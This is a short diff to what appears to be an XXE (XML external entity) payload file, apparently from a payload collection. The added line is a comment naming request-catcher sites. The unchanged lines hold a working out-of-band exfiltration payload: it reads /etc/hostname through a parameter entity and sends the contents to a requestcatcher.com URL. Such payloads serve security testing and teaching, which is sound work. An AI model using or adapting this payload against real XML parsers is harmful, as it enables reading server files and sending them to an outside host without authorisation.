@@ -1,3 +1,4 @@
+<!-- Here the site can be https://requestcatcher.com/ or https://webhook.site or others... -->
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://test12345.requestcatcher.com/?x=%file;'>">
 %eval;
